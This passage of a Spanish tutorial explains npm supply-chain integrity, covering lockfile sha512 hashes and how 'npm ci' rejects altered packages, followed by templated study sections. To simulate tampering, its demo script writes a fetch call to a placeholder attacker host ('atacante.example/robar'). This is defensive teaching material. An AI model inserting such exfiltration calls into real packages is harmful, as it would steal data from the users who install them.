- Cadena de suministro npm: lockfile, integridad y paquetes alterados existe para resolver un problema específico.
- Mide antes de adoptar complejidad.
- Conoce el caso donde NO usarlo.
- Verifica con evidencia observable.

#### ► PREGUNTAS PARA PENSAR
1. ¿Qué problema concreto resuelve cadena de suministro npm: lockfile, integridad y paquetes alterados en tu contexto?
2. ¿Cómo sabrías que cadena de suministro npm: lockfile, integridad y paquetes alterados no está funcionando bien?
3. ¿Qué alternativa más simple considerarías antes de usar cadena de suministro npm: lockfile, integridad y paquetes alterados?

</details>

<details>
<summary><strong>Capa 2 — Construcción</strong></summary>

#### Código y verificación
```mermaid
flowchart LR
    P["npm publish<br/>rutas-util 1.0.0"] --> R["Registro npm"]
    R -->|.tgz| I["npm ci"]
    L["package-lock.json<br/>integrity sha512-..."] --> I
    I -->|hash coincide| OK["instala"]
    I -->|hash distinto| NO["rechaza: EINTEGRITY"]
```

```js
import { createHash } from 'node:crypto';
import { writeFile } from 'node:fs/promises';

// Simula la publicación: el paquete original y una copia alterada.
const contenido = 'export const version = "1.0.0";\n';
await writeFile('rutas-util-1.0.0.tgz', contenido);
await writeFile('rutas-util-alterado.tgz', contenido + 'fetch("https://atacante.example/robar");\n');

// Simula la primera instalación: npm guarda el hash en el lockfile.
const integrity = 'sha512-' + createHash('sha512').update(contenido).digest('base64');
const lock = { lockfileVersion: 3, packages: { 'node_modules/rutas-util': { version: '1.0.0', integrity } } };
await writeFile('package-lock.json', JSON.stringify(lock, null, 2));
console.log(`lockfile registrado con ${integrity.slice(0, 20)}…`);
```

```js
import { createHash } from 'node:crypto';
import { readFile } from 'node:fs/promises';

function integridad(bytes) {
  return 'sha512-' + createHash('sha512').update(bytes).digest('base64');
}

const lock = JSON.parse(await readFile('package-lock.json', 'utf8'));
const esperado = lock.packages['node_modules/rutas-util'].integrity;

// Lo mismo que hace npm ci con cada archivo descargado.
for (const archivo of ['rutas-util-1.0.0.tgz', 'rutas-util-alterado.tgz']) {
  const real = integridad(await readFile(archivo));
  const veredicto = real === esperado ? 'coincide' : 'NO coincide, npm rechazaría la instalación';
  console.log(`${archivo}: ${veredicto}`);
}
```

```bash
cd academia-labs/javascript/cadena-suministro
node preparar.mjs
node verificar-integridad.mjs
```

```text
lockfile registrado con sha512-nnu+uJngDBWve…
rutas-util-1.0.0.tgz: coincide
rutas-util-alterado.tgz: NO coincide, npm rechazaría la instalación
```

</details>

### Comprueba lo construido

<details open>
<summary><strong>Capa 1 — Lectura</strong></summary>

#### ► DE QUÉ TRATA
Este tema te guía por comprueba lo construido con foco en comprensión antes de implementación.

#### ► LA IDEA EN UNA FRASE
**Entender comprueba lo construido te permite tomar mejores decisiones técnicas.**

#### ► POR QUÉ EXISTE ESTO
Resuelve un problema real de diseño o implementación y evita decisiones a ciegas.

#### ► LA ANALOGÍA
Piensa en comprueba lo construido como una herramienta de taller: útil cuando conoces su propósito y sus límites.
**Dónde se rompe la analogía:** en software, los efectos dependen del contexto, la escala y los trade-offs.

#### ► CÓMO FUNCIONA
1. Identifica el problema que comprueba lo construido resuelve.
2. Observa sus componentes y relaciones.
3. Aplica la opción más simple que funcione.
4. Verifica el resultado y los límites.

#### ► LO QUE PUEDE SALIR MAL
| Síntoma | Causa probable | Arreglo |
|---|---|---|
| Comprueba lo construido se aplica pero el resultado no mejora | Se usó sin medir el problema real | Mide antes y compara contra la alternativa simple |
| Aparece complejidad inesperada | Se adoptó la técnica sin comprender sus trade-offs | Vuelve a la sección de trade-offs y reduce el alcance |
| Falla en un caso límite | Se asumió un contexto que no se cumple | Prueba el caso límite y documenta cuándo NO usarlo |

#### ► TRADE-OFFS
| Opción | Cuándo usarla | Cuándo NO usarla |
|---|---|---|
| Usar Comprueba lo construido | Cuando el problema coincide con su propósito y el beneficio es observable | Cuando agrega complejidad sin resolver un problema real |
| Alternativa más simple | Cuando el contexto es pequeño, estable o fácil de razonar | Cuando ya demostró no escalar o no cumplir el requisito |
| Postergar la decisión | Cuando falta evidencia del problema | Cuando el costo de esperar es mayor que el costo de probar |

#### ► CUÁNDO NO USAR ESTO
No uses comprueba lo construido por defecto. Aplícalo cuando el problema lo justifique y puedas verificar el beneficio; si una alternativa más simple resuelve igual, prefiérela.

#### ► DE VUELTA A LA ANALOGÍA
Volviendo a la analogía: comprueba lo construido funciona como el modelo inicial, pero recuerda dónde se rompe: en producción importan la evidencia, la escala y el costo de equivocarte.

#### ► LO QUE DEBES RECORDAR
- Comprueba lo construido existe para resolver un problema específico.
- Mide antes de adoptar complejidad.
- Conoce el caso donde NO usarlo.
- Verifica con evidencia observable.

#### ► PREGUNTAS PARA PENSAR
1. ¿Qué problema concreto resuelve comprueba lo construido en tu contexto?
2. ¿Cómo sabrías que comprueba lo construido no está funcionando bien?
3. ¿Qué alternativa más simple considerarías antes de usar comprueba lo construido?

</details>

<details>
<summary><strong>Capa 2 — Construcción</strong></summary>

#### Nota de construcción
Este tema es principalmente conceptual en esta versión. La verificación se realiza con las preguntas de comprensión y el criterio de cuándo NO usar comprueba lo construido.

</details>
